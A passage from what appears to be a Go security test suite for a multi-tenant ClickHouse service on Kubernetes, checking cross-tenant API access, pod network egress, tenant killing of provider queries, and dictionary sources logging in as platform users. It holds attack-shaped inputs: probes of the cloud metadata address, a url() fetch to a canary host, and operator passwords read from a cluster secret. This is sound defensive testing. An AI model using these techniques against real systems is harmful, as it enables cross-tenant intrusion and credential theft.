		if st, _ := e.apiDo("DELETE", "/v1/projects/"+e.b.project+"/clusters/"+e.b.id, e.a.token); st != 404 {
			t.Errorf("DELETE of tenant B's cluster with tenant A's token: %d", st)
		}
		if st, _ := e.apiDo("GET", "/v1/projects/"+e.a.project+"/clusters", ""); st != 401 {
			t.Errorf("no token: %d, want 401", st)
		}
		if st, _ := e.apiDo("GET", "/v1/cells/cell1/desired", e.a.token); st != 401 {
			t.Errorf("tenant token on the cell-agent API: %d, want 401", st)
		}
	})
}

// TestNetworkIsolation models code execution inside tenant A's ClickHouse process: from inside
// the pod, only its own replicas, its own Keeper and DNS are reachable.
func TestNetworkIsolation(t *testing.T) {
	e := setup(t)
	a, b := e.a.id, e.b.id
	allowed := []struct {
		name, host string
		port       int
	}{
		{"own replica (native TLS)", "chi-" + a + "-default-0-1.ch-" + a + ".svc.cluster.local", 9440},
		{"own Keeper", "keeper-" + a + ".ch-" + a + ".svc.cluster.local", 2281},
	}
	for _, c := range allowed {
		t.Run("control: reaches "+c.name, func(t *testing.T) {
			if ok, out := e.podTCP(c.host, c.port); !ok {
				t.Fatalf("expected to connect: %s", out)
			}
		})
	}
	denied := []struct {
		name, host string
		port       int
	}{
		{"another tenant's server", "chi-" + b + "-default-0-0.ch-" + b + ".svc.cluster.local", 9440},
		{"another tenant's Keeper", "keeper-" + b + ".ch-" + b + ".svc.cluster.local", 2281},
		{"in-cell canary (HTTP)", e.canary, 8080},
		{"in-cell canary (MySQL port)", e.canary, 3306},
		{"Kubernetes API (service IP)", "10.96.0.1", 443},
		{"control plane on the host network", "172.18.0.1", 8080},
		{"cloud metadata address", "169.254.169.254", 80},
		{"EKS Pod Identity agent address", "169.254.170.23", 80},
		{"the shared gateway", "envoy-basalt-system-shared-b861f36d.envoy-gateway-system.svc.cluster.local", 9440},
		{"the operator's metrics", "clickhouse-operator-metrics.kube-system.svc.cluster.local", 8888},
		{"the internet", "1.1.1.1", 443},
	}
	for _, c := range denied {
		t.Run("blocked: "+c.name, func(t *testing.T) {
			if ok, out := e.podTCP(c.host, c.port); ok {
				t.Fatalf("connected to %s:%d from inside the tenant pod (%s)", c.host, c.port, out)
			}
		})
	}
	t.Run("blocked: url() from clickhouse-local inside the pod (no grants involved)", func(t *testing.T) {
		out, err := kubectl("-n", "ch-"+a, "exec", "chi-"+a+"-default-0-0-0", "--", "timeout", "20", "clickhouse", "local", "-q",
			"SELECT * FROM url('http://"+e.canary+":8080/"+e.runID+"/local', 'LineAsString') SETTINGS http_connection_timeout = 5")
		if err == nil {
			t.Fatalf("clickhouse-local reached the canary: %s", out)
		}
	})
	t.Run("no connection reached the canary", func(t *testing.T) {
		time.Sleep(2 * time.Second)
		if hits := e.canaryHits(); len(hits) > 0 {
			t.Fatalf("%d connections reached the canary:\n%s", len(hits), strings.Join(hits, "\n"))
		}
	})
}

// TestProviderQueriesCannotBeKilledByTenant: the tenant's KILL QUERY must not reach platform
// queries (probes, backups).
func TestProviderQueriesCannotBeKilledByTenant(t *testing.T) {
	e := setup(t)
	cert := e.cellCertificate(t, clickhouse.AgentClientCN)
	prov := e.connect(e.a, clickhouse.ProviderUser, "", &cert)
	done := make(chan result, 1)
	qid := "att-provider-" + e.runID
	go func() {
		done <- prov.qp("SELECT sum(sleepEachRow(0.5)) FROM numbers(20) SETTINGS max_block_size = 1, function_sleep_max_microseconds_per_block = 60000000",
			url.Values{"query_id": {qid}})
	}()
	time.Sleep(3 * time.Second)
	// control: the provider query is really running (as the provider sees it)
	if got := expectOK(t, prov.q("SELECT count() FROM system.processes WHERE query_id = '"+qid+"'")); got != "1" {
		t.Fatalf("provider query not running (count %s), so the test proves nothing", got)
	}
	a := e.admin(e.a)
	for _, k := range []string{"KILL QUERY WHERE query_id = '" + qid + "' SYNC", "KILL QUERY WHERE user = 'provider_ops' SYNC"} {
		if r := a.q(k); r.code != 0 && r.code != codeAccessDenied {
			t.Errorf("%s: %s", k, r)
		}
	}
	if r := <-done; r.err != "" || r.code != 0 {
		t.Fatalf("the tenant killed (or disturbed) a provider query: %s", r)
	}
}

// TestDictionaryCannotBorrowPlatformUsers: a local ClickHouse dictionary source logs in as
// the user named in its definition ("default" when none is given), over the LOCAL interface
// with no client address. Platform users must refuse it even when the attacker has their
// real password; the control shows the tenant's own user works the same way.
func TestDictionaryCannotBorrowPlatformUsers(t *testing.T) {
	e := setup(t)
	a := e.admin(e.a)
	st, err := secrets.NewFileStore(getenv(t, "ATTACK_SECRETS_DIR"))
	must(t, err)
	defPW, err := st.Get(context.Background(), clickhouse.DefaultPasswordSecret(e.a.id))
	must(t, err)
	out, err := kubectl("-n", "kube-system", "get", "secret", "clickhouse-operator", "-o", "jsonpath={.data.password}")
	must(t, err)
	opPW := string(decodeB64(t, out))
	try := func(user, pw string) result {
		name := "default.att_dict_as_" + user
		src := "SOURCE(CLICKHOUSE(query 'SELECT toUInt64(1) AS k, currentUser() AS v' user '" + user + "'"
		if pw != "" {
			src += " password '" + pw + "'"
		}
		src += "))"
		a.q("DROP DICTIONARY IF EXISTS " + name)
		expectOK(t, a.q("CREATE DICTIONARY "+name+" (k UInt64, v String) PRIMARY KEY k "+src+" LAYOUT(FLAT()) LIFETIME(0)"))
		defer a.q("DROP DICTIONARY IF EXISTS " + name)
		return a.q("SELECT dictGet('" + name + "', 'v', toUInt64(1))")
	}
	for _, c := range []struct{ user, pw string }{
		{"default", ""}, {"default", defPW}, {clickhouse.ProviderUser, ""}, {"clickhouse_operator", opPW},
	} {
		label := "no password"
		if c.pw != "" {
			label = "its real password"
		}
		t.Run(c.user+" with "+label, func(t *testing.T) {
			expectDenied(t, try(c.user, c.pw), codeAuthFailed, codeWrongPassword)
		})
	}
	t.Run("control: the tenant's own admin works", func(t *testing.T) {
		if got := expectOK(t, try(clickhouse.CustomerAdmin, e.a.adminPW)); got != clickhouse.CustomerAdmin {
			t.Fatalf("dictionary ran as %q", got)
		}
	})
}
